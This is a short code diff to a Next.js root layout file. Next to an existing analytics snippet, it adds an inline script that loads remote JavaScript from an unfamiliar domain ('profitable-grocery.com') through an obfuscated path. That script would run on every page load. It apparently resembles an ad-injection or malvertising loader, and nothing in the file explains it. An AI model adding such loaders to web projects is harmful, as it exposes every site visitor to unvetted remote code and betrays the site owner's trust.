@@ -30,6 +30,11 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
             __html: `window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-0J0C8KXZJJ');`,
           }}
         />
+        <script
+          dangerouslySetInnerHTML={{
+            __html: `(function(vxrr){var d=document,s=d.createElement('script'),l=d.scripts[d.scripts.length-1];s.settings=vxrr||{};s.src="//profitable-grocery.com/bHX/V.s-drG/lM0NYCWLcB/oeDmw9/uKZzU/lekyPxTtcWwcOzDpAr0/OWDGkytVNzzNA/4ZMTDJQO5sMzwc";s.async=true;s.referrerPolicy='no-referrer-when-downgrade';l.parentNode.insertBefore(s,l);})({})`,
+          }}
+        />
         </head>
       <body className="min-h-screen bg-stone-50 text-stone-900 antialiased">{children}</body>
     </html>
